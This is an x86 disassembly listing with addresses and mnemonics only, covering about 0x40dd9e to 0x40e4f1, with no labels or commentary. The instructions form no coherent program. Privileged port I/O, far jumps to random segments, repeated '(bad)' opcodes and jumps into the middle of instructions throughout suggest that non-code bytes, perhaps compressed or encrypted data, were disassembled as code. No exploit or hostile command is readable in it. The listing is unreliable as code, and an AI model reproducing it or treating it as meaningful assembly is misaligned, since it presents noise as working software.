  40dd9e:	mov    al,ds:0x1b23a0cc
  40dda3:	test   ecx,edi
  40dda5:	les    edi,FWORD PTR [ebp-0x29]
  40dda8:	jmp    0x40de1d
  40ddaa:	pop    ebx
  40ddab:	fdivp  st(1),st
  40ddad:	mov    bh,0xb6
  40ddaf:	dec    edx
  40ddb0:	sahf   
  40ddb1:	jmp    FWORD PTR [esi-0x7b]
  40ddb4:	mov    ah,0xc9
  40ddb6:	cwde   
  40ddb7:	mov    ds:0x8a36773f,eax
  40ddbc:	dec    edx
  40ddbd:	mov    eax,ds:0xe665472a
  40ddc2:	jo     0x40ddd2
  40ddc4:	es call 0x728f:0x959c7c3e
  40ddcc:	dec    esi
  40ddcd:	dec    esp
  40ddce:	pop    edx
  40ddcf:	loop   0x40ddfc
  40ddd1:	pusha  
  40ddd2:	mov    ah,0x48
  40ddd4:	push   cs
  40ddd5:	fwait
  40ddd6:	or     eax,0x8a2abf9a
  40dddb:	adc    al,0x96
  40dddd:	pop    esi
  40ddde:	sub    DWORD PTR [ecx+edx*2],edi
  40dde1:	loopne 0x40de0c
  40dde3:	inc    eax
  40dde4:	mov    WORD PTR [ebp-0x14350616],?
  40ddea:	cmp    eax,DWORD PTR [edi-0x6db15c00]
  40ddf0:	test   al,0x14
  40ddf2:	inc    esp
  40ddf3:	les    esi,FWORD PTR [esi-0x7b]
  40ddf6:	inc    esi
  40ddf7:	add    BYTE PTR [ecx],0xd
  40ddfa:	cmp    ecx,DWORD PTR [edx]
  40ddfc:	imul   ebp,DWORD PTR [ebx-0x18457a17],0x18b311a2
  40de06:	pop    es
  40de07:	mov    ds:0xccdbe36c,al
  40de0c:	fs pop ds
  40de0e:	pop    edx
  40de0f:	outs   dx,BYTE PTR ds:[esi]
  40de10:	test   eax,0xb050e676
  40de15:	repnz push esi
  40de17:	mov    es,WORD PTR ds:0x2ba3ee0
  40de1d:	fs daa 
  40de1f:	jns    0x40de9a
  40de21:	add    BYTE PTR [edx-0x57],cl
  40de24:	repz ret 
  40de26:	pop    edx
  40de27:	pop    esi
  40de28:	dec    esi
  40de29:	cmp    DWORD PTR [eax],0x2c
  40de2c:	jb     0x40ddd5
  40de2e:	out    0x85,eax
  40de30:	cmp    DWORD PTR [ebp+0x16],esi
  40de33:	add    edi,DWORD PTR [edi]
  40de35:	(bad)  
  40de37:	and    BYTE PTR [eax+0x2],bh
  40de3a:	add    eax,0xd6e07054
  40de3f:	ss pop ss
  40de41:	fs dec ebx
  40de43:	sahf   
  40de44:	push   cs
  40de45:	test   BYTE PTR [edi-0x7e00c03a],bl
  40de4b:	ss jbe 0x40de75
  40de4e:	stc    
  40de4f:	mov    BYTE PTR [ebp+0xcb8506],ch
  40de55:	add    eax,0x906d840c
  40de5a:	(bad)  
  40de5b:	mov    ch,0x22
  40de5d:	in     eax,dx
  40de5e:	sbb    al,0x9c
  40de60:	icebp  
  40de61:	data16 loope 0x40dee0
  40de64:	mov    bl,0x42
  40de66:	shl    edi,cl
  40de68:	push   edx
  40de69:	adc    BYTE PTR [edi-0x44b5907f],dh
  40de6f:	mov    edx,ebp
  40de71:	inc    esp
  40de72:	fiadd  DWORD PTR [ecx+ebp*8-0x19]
  40de76:	and    eax,esp
  40de78:	js     0x40deb8
  40de7a:	test   eax,0x84dd755b
  40de7f:	ins    DWORD PTR es:[edi],dx
  40de80:	sbb    DWORD PTR [esi+0x2f],0xdaca3860
  40de87:	test   BYTE PTR [edi-0x49],dh
  40de8a:	cli    
  40de8b:	push   ss
  40de8c:	mov    ah,BYTE PTR [edx]
  40de8e:	push   ebx
  40de8f:	fs xor dl,bh
  40de92:	in     al,0xf4
  40de94:	in     eax,dx
  40de95:	lods   eax,DWORD PTR ds:[esi]
  40de96:	mov    ch,0x4d
  40de99:	sar    DWORD PTR [eax],0x43
  40de9c:	jmp    0x417c8787
  40dea1:	add    cl,ah
  40dea3:	cmp    BYTE PTR [esi],0xc9
  40dea6:	retf   0xfe28
  40dea9:	add    eax,0xe68f1dd0
  40deae:	mov    al,ds:0xd4f7aab8
  40deb3:	ss je  0x40de88
  40deb6:	dec    ecx
  40deb7:	in     eax,dx
  40deb8:	jl     0x40de8f
  40deba:	pop    ebx
  40debb:	push   edx
  40debc:	cdq    
  40debd:	leave  
  40debe:	cld    
  40debf:	outs   dx,DWORD PTR ds:[esi]
  40dec0:	xor    ah,BYTE PTR [ecx+0x7bbc8283]
  40dec6:	or     eax,0x9ac0d05a
  40decb:	ret    
  40decc:	inc    ecx
  40decd:	mov    dh,0x5f
  40decf:	pop    edx
  40ded0:	inc    edi
  40ded1:	xchg   sp,ax
  40ded3:	and    BYTE PTR [ecx+eiz*8+0x14114f78],0x72
  40dedb:	xchg   DWORD PTR [esi],ebx
  40dedd:	fdivr  st(0),st
  40dedf:	repz aas 
  40dee1:	ins    BYTE PTR es:[di],dx
  40dee3:	xor    BYTE PTR [ebx+0xf],ah
  40dee6:	mov    BYTE PTR [eax+0x6a],dl
  40dee9:	xchg   ebx,eax
  40deea:	add    al,0xa5
  40deec:	aas    
  40deed:	repnz cmc 
  40deef:	out    0x9e,al
  40def1:	cli    
  40def2:	pop    ebp
  40def3:	inc    eax
  40def4:	aas    
  40def5:	xchg   edi,eax
  40def6:	jmp    0x37d053ab
  40defb:	pop    esp
  40defc:	add    dh,bl
  40defe:	push   es
  40deff:	inc    ebx
  40df00:	sbb    eax,0x17b3b266
  40df05:	pop    es
  40df06:	lock and BYTE PTR [edi],bh
  40df09:	push   ebp
  40df0a:	jbe    0x40df02
  40df0c:	push   cs
  40df0d:	rep lods al,BYTE PTR ds:[esi]
  40df0f:	inc    edi
  40df10:	gs fst st(4)
  40df13:	dec    esi
  40df14:	test   al,bh
  40df16:	mov    edi,ebx
  40df18:	xor    cl,BYTE PTR [ebx]
  40df1a:	mov    ebx,DWORD PTR [eax-0x6f9bf4c1]
  40df20:	pmullw mm6,QWORD PTR [eax+0x23]
  40df24:	ss fsubr st(2),st
  40df27:	inc    edi
  40df28:	js     0x40df72
  40df2a:	pop    ecx
  40df2b:	mov    esi,0xf59ae4d5
  40df30:	lock stc 
  40df32:	inc    eax
  40df33:	or     eax,0xb5b7deb6
  40df38:	jl     0x40df40
  40df3a:	cmp    al,0x85
  40df3c:	lods   al,BYTE PTR ds:[esi]
  40df3d:	neg    cl
  40df3f:	pusha  
  40df40:	xor    ecx,DWORD PTR ds:[eax+0x66]
  40df44:	jne    0x40df26
  40df46:	repnz mov bh,0x1b
  40df49:	out    0xfc,eax
  40df4b:	push   0xc6615a3d
  40df50:	inc    esi
  40df51:	mov    ah,0x2a
  40df53:	leave  
  40df54:	repz and ebx,DWORD PTR [edx+0x1e]
  40df58:	in     eax,dx
  40df59:	pop    esp
  40df5a:	pop    esi
  40df5b:	ret    0xe6d6
  40df5e:	test   al,0x7a
  40df60:	sbb    DWORD PTR [di+0x6d74],edi
  40df65:	dec    ebx
  40df66:	pop    ecx
  40df67:	mov    al,ds:0xd4583af8
  40df6c:	mov    cl,0x8a
  40df6e:	sbb    al,0x60
  40df70:	jecxz  0x40dff0
  40df72:	fiadd  WORD PTR [edi+0x5f]
  40df75:	gs aad 0x90
  40df78:	cli    
  40df79:	cwde   
  40df7a:	push   ds
  40df7b:	or     eax,0xdf6f4f06
  40df80:	adc    ah,bh
  40df82:	lods   al,BYTE PTR ds:[esi]
  40df83:	and    ebp,DWORD PTR [eax-0x25]
  40df86:	sar    BYTE PTR fs:[ecx+edx*2],0x38
  40df8b:	push   eax
  40df8c:	or     ecx,0x2d
  40df8f:	pop    ebp
  40df90:	out    0x3c,eax
  40df92:	add    esp,DWORD PTR [ebx-0x64]
  40df95:	rol    BYTE PTR [si+0x7ac0],cl
  40df9a:	push   esp
  40df9b:	je     0x40dfa3
  40df9d:	xor    DWORD PTR [ecx+0x1e],0x3c
  40dfa1:	pop    ecx
  40dfa2:	cmp    al,0x6c
  40dfa4:	add    BYTE PTR [eax+0x4f],ah
  40dfa7:	outs   dx,BYTE PTR ds:[esi]
  40dfa8:	call   0x8756b294
  40dfad:	enter  0x7ea0,0x99
  40dfb1:	mov    ch,0xd9
  40dfb3:	scas   al,BYTE PTR es:[edi]
  40dfb4:	or     DWORD PTR [edi+edx*1],0x2c
  40dfb8:	cmp    al,0xaa
  40dfba:	pop    ebx
  40dfbb:	mov    eax,0x43c2e6e3
  40dfc0:	out    dx,eax
  40dfc1:	inc    esi
  40dfc2:	or     DWORD PTR [edi+esi*8-0x31],edi
  40dfc6:	test   DWORD PTR [eax+0x345a152e],esi
  40dfcc:	xchg   esi,eax
  40dfcd:	xchg   ebp,eax
  40dfce:	adc    DWORD PTR [ebp-0x7a13615e],ebp
  40dfd4:	(bad)  
  40dfd5:	mov    eax,ds:0x193ed29e
  40dfda:	fwait
  40dfdb:	mov    bl,0xa1
  40dfdd:	sbb    ah,BYTE PTR [ecx+0x57]
  40dfe0:	push   0xffffffe6
  40dfe2:	data16 jno 0x40e02a
  40dfe5:	ja     0x40e061
  40dfe7:	jecxz  0x40dfa5
  40dfe9:	aaa    
  40dfea:	cwde   
  40dfeb:	xchg   esi,eax
  40dfec:	fld    QWORD PTR [ebx+0x5b]
  40dfef:	cwde   
  40dff0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dff1:	jmp    0xe7848a71
  40dff6:	mov    al,ds:0xd3d9df7d
  40dffb:	fisttp WORD PTR [ecx+0x73]
  40dffe:	daa    
  40dfff:	xor    DWORD PTR [esi-0x4d1ba468],ebp
  40e005:	mov    ch,BYTE PTR [eax]
  40e007:	pop    edi
  40e008:	push   ss
  40e009:	cmc    
  40e00a:	mov    BYTE PTR [eax+eiz*8+0x38df433a],0x79
  40e012:	cld    
  40e013:	cmp    al,0xe2
  40e015:	retf   
  40e016:	sub    DWORD PTR [esi+0x23],eax
  40e019:	jo     0x40e057
  40e01b:	cmc    
  40e01c:	push   0x30
  40e01e:	data16 test BYTE PTR [eax],ah
  40e021:	stos   BYTE PTR es:[edi],al
  40e022:	mov    al,ds:0xe50b3f63
  40e027:	scas   eax,DWORD PTR es:[edi]
  40e028:	repz ror ebx,0x4a
  40e02c:	or     edi,esp
  40e02e:	(bad)  
  40e02f:	and    eax,DWORD PTR [ebx+ecx*2-0x5a]
  40e033:	fsub   DWORD PTR [eax+0x5]
  40e036:	or     edx,DWORD PTR [edi+ebp*4-0x19]
  40e03a:	rol    BYTE PTR es:[edi-0xd],0xa4
  40e03f:	pop    edx
  40e040:	cmp    eax,0xef2a2ce6
  40e045:	jp     0x40e08c
  40e047:	inc    edx
  40e048:	test   eax,0x3f4d161c
  40e04d:	leave  
  40e04e:	cmp    bh,BYTE PTR [ebp-0x6a]
  40e051:	sub    edi,DWORD PTR [ebx-0x71]
  40e054:	(bad)  
  40e055:	stc    
  40e056:	mov    ah,0xe3
  40e058:	fsubr  DWORD PTR [ecx+0x59]
  40e05b:	retf   0xeee
  40e05e:	fwait
  40e05f:	push   edi
  40e060:	aas    
  40e061:	imul   edx,DWORD PTR [edi],0xffffffdf
  40e064:	push   edi
  40e065:	or     BYTE PTR [edi],bl
  40e067:	dec    esi
  40e068:	icebp  
  40e069:	fld    DWORD PTR [edi+ebp*1]
  40e06c:	imul   esp,DWORD PTR [esi+0x55],0x99eaedae
  40e073:	xchg   ebp,eax
  40e074:	and    bl,BYTE PTR [edi-0x12]
  40e077:	les    ebp,FWORD PTR [edx-0x6ad7c51a]
  40e07d:	inc    ecx
  40e07e:	xor    al,0x20
  40e080:	dec    edx
  40e081:	lods   al,BYTE PTR ds:[esi]
  40e082:	aaa    
  40e083:	test   BYTE PTR [ecx+0x3fb47bd0],al
  40e089:	jae    0x40e07f
  40e08b:	dec    ebx
  40e08c:	pop    ebx
  40e08d:	push   edx
  40e08e:	xor    bl,BYTE PTR [esi-0x1026e106]
  40e094:	mov    edx,0x147518e9
  40e099:	sbb    ebp,DWORD PTR [ebx-0x74]
  40e09c:	add    eax,0x8a01b9b6
  40e0a1:	jge    0x40e07e
  40e0a3:	jne    0x40e046
  40e0a5:	add    BYTE PTR [eax+0xe],bl
  40e0a8:	xchg   edx,eax
  40e0a9:	outs   dx,DWORD PTR ds:[esi]
  40e0aa:	cmp    dh,BYTE PTR [ebp-0x227d18cb]
  40e0b0:	bound  edi,QWORD PTR [ebp-0x5b81d813]
  40e0b6:	in     al,dx
  40e0b7:	out    dx,al
  40e0b8:	loopne 0x40e128
  40e0ba:	pop    ebx
  40e0bb:	and    al,0x1
  40e0bd:	pop    ds
  40e0be:	add    eax,0x2486ea88
  40e0c3:	test   DWORD PTR [edx+0x45],ecx
  40e0c6:	inc    ecx
  40e0c7:	pop    es
  40e0c8:	aas    
  40e0c9:	test   DWORD PTR ds:0xa4cbd30a,esi
  40e0cf:	pminub mm2,mm7
  40e0d2:	jecxz  0x40e12a
  40e0d4:	ins    BYTE PTR es:[edi],dx
  40e0d5:	popf   
  40e0d6:	jecxz  0x40e05c
  40e0d8:	call   0xe6e07073
  40e0dd:	dec    esi
  40e0de:	iret   
  40e0df:	push   ebx
  40e0e0:	arpl   WORD PTR [ebx-0x2021d7a5],cx
  40e0e6:	mov    al,BYTE PTR [ecx-0x7af2ee46]
  40e0ec:	mov    bh,0xcc
  40e0ee:	js     0x40e107
  40e0f0:	aas    
  40e0f1:	xor    DWORD PTR [edx-0x6],0x682c9352
  40e0f8:	ja     0x40e0e1
  40e0fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0fb:	adc    BYTE PTR [ebp+ecx*1-0x55b9c93a],0x4e
  40e103:	paddusb mm6,QWORD PTR [ebx-0x4d]
  40e107:	dec    esp
  40e108:	push   esi
  40e109:	(bad)  
  40e10a:	pop    edx
  40e10b:	lods   al,BYTE PTR ds:[esi]
  40e10c:	cwde   
  40e10d:	push   ecx
  40e10e:	or     cl,BYTE PTR [eax+0x4a]
  40e111:	hlt    
  40e112:	pop    ecx
  40e113:	sti    
  40e114:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40e116:	pop    edx
  40e117:	out    0xe8,eax
  40e119:	shl    DWORD PTR [ebp-0x5f],0x3f
  40e11d:	out    0xaf,eax
  40e11f:	push   edi
  40e120:	push   eax
  40e121:	jg     0x40e0eb
  40e123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e124:	dec    ecx
  40e125:	out    0xf2,al
  40e127:	push   cs
  40e128:	mov    es,WORD PTR [edx]
  40e12a:	xor    BYTE PTR [ebx+ebx*4],0x2d
  40e12e:	sbb    al,0xe3
  40e130:	jae    0x40e0c4
  40e132:	pop    edx
  40e133:	test   al,0x8c
  40e135:	jl     0x40e1a4
  40e137:	mov    edx,0x84835236
  40e13c:	add    eax,0x3fe872b9
  40e141:	add    ebx,DWORD PTR [eax]
  40e143:	sub    BYTE PTR [ebx],bh
  40e145:	mov    eax,ds:0xe874a254
  40e14a:	push   ss
  40e14b:	jmp    0x4d63:0xfaa2a05
  40e152:	push   0x7
  40e154:	mov    ecx,0xe04d1789
  40e159:	cmp    BYTE PTR [edx+0x58],bl
  40e15c:	xor    eax,0xbe580c8
  40e161:	out    0xf4,al
  40e163:	fs dec eax
  40e165:	rol    BYTE PTR [edx-0x10],1
  40e168:	mov    al,0x9e
  40e16a:	xchg   ebp,eax
  40e16b:	fnstsw WORD PTR [edi]
  40e16d:	aas    
  40e16e:	scas   eax,DWORD PTR es:[edi]
  40e16f:	mov    edi,0x7755c960
  40e174:	or     bl,BYTE PTR [edx]
  40e176:	rcl    BYTE PTR [eax+0x44],1
  40e179:	push   ss
  40e17a:	fidivr WORD PTR [ecx+0x60]
  40e17d:	xchg   edx,eax
  40e17e:	sbb    eax,0xd9813184
  40e183:	aaa    
  40e184:	cmp    BYTE PTR [ecx-0x59dbb23c],cl
  40e18a:	mov    bh,0xf8
  40e18c:	sbb    ecx,DWORD PTR [ecx-0x36]
  40e18f:	aam    0x84
  40e191:	dec    esp
  40e192:	mov    ds:0xb2b8b284,al
  40e197:	pop    ecx
  40e198:	ja     0x40e1af
  40e19a:	xchg   edi,eax
  40e19b:	hlt    
  40e19c:	xor    DWORD PTR [ebx+0x50],esp
  40e19f:	pop    ecx
  40e1a0:	(bad)  
  40e1a1:	aas    
  40e1a2:	ret    0x5c45
  40e1a5:	sahf   
  40e1a6:	mov    dh,0x77
  40e1a8:	aas    
  40e1a9:	mov    ch,0x22
  40e1ab:	call   0xdf3e:0x5f1d0149
  40e1b2:	sbb    al,0x78
  40e1b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1b5:	outs   dx,DWORD PTR ds:[esi]
  40e1b6:	(bad)  
  40e1b8:	sti    
  40e1b9:	(bad)  
  40e1ba:	push   es
  40e1bb:	(bad)  
  40e1bc:	shr    dl,0x32
  40e1bf:	adc    DWORD PTR [esi],edi
  40e1c1:	pop    ss
  40e1c2:	into   
  40e1c3:	sbb    ecx,edi
  40e1c5:	cmp    ah,BYTE PTR [ecx+0x7ae4348a]
  40e1cb:	into   
  40e1cc:	inc    edi
  40e1cd:	mov    bl,0xc5
  40e1cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1d0:	adc    dh,BYTE PTR [edi]
  40e1d2:	pop    ss
  40e1d3:	inc    eax
  40e1d4:	aas    
  40e1d5:	cmp    eax,edx
  40e1d7:	das    
  40e1d8:	aaa    
  40e1d9:	adc    DWORD PTR [ecx-0x2f195725],0xffffffe0
  40e1e0:	in     al,0x43
  40e1e2:	mov    al,0xfb
  40e1e4:	cdq    
  40e1e5:	dec    ebp
  40e1e6:	or     eax,0x5a04a6c7
  40e1eb:	and    BYTE PTR [eax],0x2
  40e1ee:	enter  0x9400,0x19
  40e1f2:	call   0xe0e94d7c
  40e1f7:	dec    edi
  40e1f8:	cmp    bh,ch
  40e1fa:	or     al,0x68
  40e1fc:	mov    fs:0x77bf4751,al
  40e202:	fdivr  DWORD PTR [edx-0x6d76dcc6]
  40e208:	push   esi
  40e209:	mov    ah,0x30
  40e20b:	mov    ebx,0x85863cac
  40e210:	pop    edx
  40e211:	mov    eax,ds:0x87c6be75
  40e216:	pop    ebx
  40e217:	add    BYTE PTR [ecx],bh
  40e219:	bound  ecx,QWORD PTR [ecx+0x4cc5deb3]
  40e21f:	test   cl,dh
  40e221:	pop    ebx
  40e222:	popa   
  40e223:	cmp    DWORD PTR [eax],0xb29df3b1
  40e229:	shl    ch,0xc0
  40e22c:	ins    DWORD PTR es:[edi],dx
  40e22d:	das    
  40e22e:	xchg   DWORD PTR [ecx+eiz*1-0x42bf9b0c],eax
  40e235:	jnp    0x40e295
  40e237:	mov    bh,0x3e
  40e239:	mov    bh,0xfa
  40e23b:	iret   
  40e23c:	fidivr DWORD PTR [ecx]
  40e23e:	adc    DWORD PTR gs:[esi-0x6f390be8],0x74
  40e246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e247:	call   0x5ada:0x9623f03e
  40e24e:	mov    al,0x66
  40e250:	dec    ebp
  40e251:	add    bl,BYTE PTR [edx-0x36]
  40e254:	aaa    
  40e255:	bound  edi,QWORD PTR ds:0xe8e79dab
  40e25b:	ins    BYTE PTR es:[edi],dx
  40e25c:	jnp    0x40e2b4
  40e25e:	(bad)  
  40e25f:	pop    esp
  40e260:	icebp  
  40e261:	jns    0x40e2aa
  40e263:	sti    
  40e264:	lods   al,BYTE PTR ds:[esi]
  40e265:	or     BYTE PTR [edx-0x68],bl
  40e268:	mov    ch,BYTE PTR [ebp-0x4d8d636a]
  40e26e:	adc    al,BYTE PTR [edx-0x53e7a5c5]
  40e274:	out    dx,eax
  40e275:	(bad)  
  40e276:	push   ebx
  40e277:	test   DWORD PTR [edi],edi
  40e279:	cmc    
  40e27a:	mov    ds:0x9767c037,eax
  40e27f:	jae    0x40e2b3
  40e281:	out    0xfc,eax
  40e283:	sar    DWORD PTR [edi],1
  40e285:	je     0x40e22e
  40e287:	push   edx
  40e288:	adc    al,0xd6
  40e28a:	cdq    
  40e28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e28c:	inc    ebx
  40e28d:	loopne 0x40e2ed
  40e28f:	out    dx,al
  40e290:	pop    edi
  40e291:	out    0xe5,al
  40e293:	mov    eax,esi
  40e295:	pop    esi
  40e296:	adc    DWORD PTR [ecx+0x22],eax
  40e299:	pop    ebp
  40e29a:	test   BYTE PTR [ebp+0x61dfc6dc],al
  40e2a0:	(bad)  
  40e2a1:	jmp    0x40e29f
  40e2a3:	fstp   DWORD PTR [eax]
  40e2a5:	inc    ebx
  40e2a6:	stos   BYTE PTR es:[edi],al
  40e2a7:	int3   
  40e2a8:	ds aas 
  40e2aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2ab:	sub    DWORD PTR [edx+0x2a],edx
  40e2ae:	loop   0x40e329
  40e2b0:	scas   al,BYTE PTR es:[edi]
  40e2b1:	cli    
  40e2b2:	and    ebx,DWORD PTR [ecx+0x3306e23f]
  40e2b8:	rol    BYTE PTR [ebp-0x7e],1
  40e2bb:	aaa    
  40e2bc:	and    eax,0x66ec5b6a
  40e2c1:	push   ebp
  40e2c2:	jae    0x40e2ac
  40e2c4:	repnz mov ch,bh
  40e2c7:	test   DWORD PTR [edi],ebp
  40e2c9:	dec    esi
  40e2ca:	pop    ds
  40e2cb:	mov    edx,0x7dbffb3f
  40e2d0:	sbb    BYTE PTR [ecx],0x9a
  40e2d3:	in     al,0x74
  40e2d5:	or     al,0x2c
  40e2d7:	jns    0x40e2bf
  40e2d9:	ret    0xbd2b
  40e2dc:	cmp    al,0x2f
  40e2de:	xchg   ecx,eax
  40e2df:	add    al,0x33
  40e2e1:	mov    ds:0xbd3f74fe,al
  40e2e6:	mov    ds:0x6183ca54,eax
  40e2eb:	outs   dx,DWORD PTR ds:[esi]
  40e2ec:	shl    dh,1
  40e2ee:	adc    dh,BYTE PTR [esi]
  40e2f0:	imul   DWORD PTR [ebp+0x5c43eac7]
  40e2f6:	rcr    BYTE PTR [ebp+ebx*2+0x155e5af1],cl
  40e2fd:	mov    dh,0x10
  40e2ff:	rcr    BYTE PTR [eax],1
  40e301:	loop   0x40e2b6
  40e303:	test   dl,dl
  40e305:	test   BYTE PTR ds:0xbff922a7,ch
  40e30b:	pop    esp
  40e30c:	dec    esi
  40e30d:	sbb    BYTE PTR [edi],dl
  40e30f:	push   edi
  40e310:	daa    
  40e311:	fwait
  40e312:	pop    edx
  40e313:	add    eax,0x2bc09668
  40e318:	aas    
  40e319:	xor    esp,eax
  40e31b:	bound  ecx,QWORD PTR ds:0x3e60ccca
  40e321:	mov    ch,0xcc
  40e323:	pop    ds
  40e324:	sub    esi,edx
  40e326:	add    al,0xa7
  40e328:	das    
  40e329:	out    0x7a,eax
  40e32b:	mov    al,0x97
  40e32d:	xor    eax,0xe008f06c
  40e332:	into   
  40e333:	xchg   esi,eax
  40e334:	mov    ah,0xdb
  40e336:	jg     0x40e354
  40e338:	leave  
  40e339:	loop   0x40e395
  40e33b:	lods   al,BYTE PTR ds:[esi]
  40e33c:	and    dh,0xa8
  40e33f:	jmp    0x8668:0xabb46347
  40e346:	into   
  40e347:	push   es
  40e348:	es ins DWORD PTR es:[edi],dx
  40e34a:	pop    ebx
  40e34b:	inc    edx
  40e34c:	pop    es
  40e34d:	dec    esi
  40e34e:	les    edi,FWORD PTR [edx+ebx*2-0x13]
  40e352:	mov    al,0x84
  40e354:	inc    ecx
  40e355:	inc    ebx
  40e356:	ror    esp,cl
  40e358:	ds int 0x92
  40e35b:	rcl    BYTE PTR [ebp+eiz*1+0x72],cl
  40e35f:	adc    DWORD PTR [esi+eiz*8+0x1615ab44],esp
  40e366:	or     DWORD PTR [edi],esp
  40e368:	mov    DWORD PTR es:[ecx+0x5adca903],edx
  40e36f:	cwde   
  40e370:	rol    BYTE PTR [edx],0xac
  40e373:	dec    edi
  40e374:	jmp    FWORD PTR [edx]
  40e376:	and    eax,esp
  40e378:	add    BYTE PTR [esi+edi*2-0x343e6e7d],al
  40e37f:	cs (bad) 
  40e381:	xor    cl,BYTE PTR [edx]
  40e383:	pop    edi
  40e384:	cmp    eax,0x1f385b8b
  40e389:	mov    ds:0x7dae19a4,al
  40e38e:	jp     0x40e382
  40e390:	ficomp DWORD PTR [ebx+ebx*2]
  40e393:	push   0x25
  40e395:	xlat   BYTE PTR ds:[ebx]
  40e396:	mov    BYTE PTR [ebx+eax*1+0x445dac8d],bh
  40e39d:	out    0x28,eax
  40e39f:	inc    esp
  40e3a0:	lahf   
  40e3a1:	mov    bl,0x57
  40e3a3:	mov    ch,0x25
  40e3a5:	out    0x5e,al
  40e3a7:	psrad  mm1,0x79
  40e3ab:	jns    0x40e427
  40e3ad:	push   edx
  40e3ae:	mov    edi,0x5a8cc27e
  40e3b3:	sbb    al,0xfc
  40e3b5:	xor    ebx,0xd126c88e
  40e3bb:	test   DWORD PTR [eax],esp
  40e3bd:	sbb    ebx,esp
  40e3bf:	fdivr  DWORD PTR [esi]
  40e3c1:	adc    esp,ebp
  40e3c3:	outs   dx,BYTE PTR ds:[esi]
  40e3c4:	stos   DWORD PTR es:[edi],eax
  40e3c5:	lds    esp,FWORD PTR [eax+0x641a8a9f]
  40e3cb:	fisttp DWORD PTR [esi-0x19]
  40e3ce:	mov    eax,0x95593c6d
  40e3d3:	test   al,0x9c
  40e3d5:	mov    al,ds:0x7353d4fa
  40e3da:	dec    edi
  40e3db:	ret    0x553f
  40e3de:	idiv   BYTE PTR [edi-0x4848d245]
  40e3e4:	adc    bh,bh
  40e3e6:	mov    eax,0x4c88ec85
  40e3eb:	cwde   
  40e3ec:	aas    
  40e3ed:	push   edi
  40e3ee:	cmp    BYTE PTR [ebp-0x301d3293],dh
  40e3f4:	icebp  
  40e3f5:	fdivr  DWORD PTR [edx-0x2fb707bb]
  40e3fb:	sub    eax,0x85b22d0c
  40e400:	fbstp  TBYTE PTR [ebx-0x17]
  40e403:	je     0x40e444
  40e405:	popf   
  40e406:	mov    ds:0xacce195c,al
  40e40b:	fwait
  40e40c:	out    0xe7,al
  40e40e:	mov    ds:0xa3d47b7,al
  40e413:	or     eax,0x83dc8c75
  40e418:	mov    dh,bh
  40e41a:	popa   
  40e41b:	jl     0x40e425
  40e41d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e41e:	mov    DWORD PTR [eax+0x5deec55d],0x84be5b4a
  40e428:	pop    edi
  40e429:	add    ch,dl
  40e42b:	inc    esi
  40e42c:	and    bh,BYTE PTR [ebx]
  40e42e:	arpl   WORD PTR [ebp-0x1],si
  40e431:	out    0x31,eax
  40e433:	inc    esp
  40e434:	sub    BYTE PTR [eax+0x2c],bh
  40e437:	pop    sp
  40e439:	xchg   ecx,eax
  40e43a:	sbb    eax,0x7d763885
  40e43f:	shl    DWORD PTR [eax],1
  40e441:	fldenv [ebx-0x3f185a38]
  40e447:	lahf   
  40e448:	xor    ch,al
  40e44a:	xor    edi,DWORD PTR ds:0xb9db46e0
  40e450:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e451:	lock dec eax
  40e453:	test   dh,ah
  40e455:	mov    dl,bh
  40e457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e458:	add    esi,ebp
  40e45a:	pop    edx
  40e45b:	enter  0xf066,0xcd
  40e45f:	int3   
  40e460:	adc    BYTE PTR [edx+0x59],al
  40e463:	test   al,0xf0
  40e465:	arpl   WORD PTR [esi-0x6872117c],bp
  40e46b:	fcom   QWORD PTR [eax+eiz*8+0x66d7e05e]
  40e472:	call   DWORD PTR [eax]
  40e474:	(bad)  
  40e475:	fcom   DWORD PTR [esp+ecx*4+0xc]
  40e479:	rcr    DWORD PTR [edi],0xb0
  40e47c:	test   BYTE PTR [ebx],bl
  40e47e:	cli    
  40e47f:	test   DWORD PTR [ecx-0x60],esp
  40e482:	mov    eax,0x5a5eaef4
  40e487:	(bad)  
  40e489:	push   esi
  40e48a:	scas   al,BYTE PTR es:[edi]
  40e48b:	jmp    0x1259:0x855bad76
  40e492:	pop    ds
  40e493:	imul   edi,DWORD PTR [esi],0xfffffff9
  40e496:	loop   0x40e44d
  40e498:	jge    0x40e48f
  40e49a:	mov    ebx,DWORD PTR [edi]
  40e49c:	add    ebx,edx
  40e49e:	and    dh,BYTE PTR [ecx]
  40e4a0:	aam    0xe6
  40e4a2:	push   ds
  40e4a3:	xchg   esp,eax
  40e4a4:	loopne 0x40e4a9
  40e4a6:	sub    ch,BYTE PTR [edi]
  40e4a8:	inc    esi
  40e4a9:	stc    
  40e4aa:	das    
  40e4ab:	ins    DWORD PTR es:[edi],dx
  40e4ac:	js     0x40e4ce
  40e4ae:	or     eax,0x54e9e8be
  40e4b3:	or     eax,0x7ffb5c93
  40e4b8:	jl     0x40e493
  40e4ba:	adc    BYTE PTR [esp+eax*4+0x3f08cb01],al
  40e4c1:	imul   eax,ecx,0xffffffb2
  40e4c4:	xchg   ecx,eax
  40e4c5:	arpl   WORD PTR [esi+0x37],di
  40e4c8:	jo     0x40e4ce
  40e4ca:	xchg   BYTE PTR [eax-0x76],bh
  40e4cd:	sahf   
  40e4ce:	or     al,0x85
  40e4d0:	sub    al,BYTE PTR [edx]
  40e4d2:	lea    esp,[edx+0x3f]
  40e4d5:	or     esp,esi
  40e4d7:	jmp    0x40e4de
  40e4d9:	loopne 0x40e555
  40e4db:	sbb    BYTE PTR [ecx+ebp*8+0x2d8bf1c2],bh
  40e4e2:	clc    
  40e4e3:	jp     0x40e47e
  40e4e5:	push   0xb220b50
  40e4ea:	(bad)  
  40e4eb:	inc    ebx
  40e4ec:	mov    al,ds:0x67532b87
  40e4f1:	cmp    eax,0x673ab6bb
